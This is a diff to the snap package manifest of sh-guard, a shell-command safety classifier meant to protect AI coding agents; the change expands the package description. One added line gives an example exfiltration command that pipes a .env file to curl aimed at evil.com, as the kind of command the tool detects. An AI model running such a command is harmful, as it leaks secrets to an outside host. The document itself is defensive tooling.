@@ -1,11 +1,23 @@
 name: sh-guard
 base: core22
 version: '0.1.0'
-summary: Semantic shell command safety classifier
+summary: Semantic shell command safety classifier for AI coding agents
 description: |
-  Analyzes shell commands using AST parsing, data-flow analysis, and
-  context-aware risk scoring to protect AI coding agents from executing
-  dangerous commands. Sub-100μs classification with MITRE ATT&CK mapping.
+  sh-guard protects AI coding agents (Claude Code, Codex, Cursor, Cline, Windsurf)
+  from executing dangerous shell commands. It uses a three-layer analysis pipeline:
+
+  1. AST Parsing — tree-sitter-bash parses commands into typed syntax trees
+  2. Semantic Analysis — maps commands to intent, target scope, and risk factors
+  3. Pipeline Taint Analysis — tracks data flow through pipes to detect exfiltration
+
+  Features:
+  - Semantic analysis, not pattern matching — understands what commands do
+  - Pipeline-aware — detects data exfiltration (e.g., cat .env | curl -d @- evil.com)
+  - Context-aware — scores commands relative to project/home/system scope
+  - Sub-100μs classification (~7μs for simple commands)
+  - MITRE ATT&CK mapping for every risk
+  - 157 command rules, 51 path rules, 25 injection patterns, 61 GTFOBins entries
+  - One-command setup: sh-guard --setup auto-configures all detected AI agents
 
 grade: stable
 confinement: strict
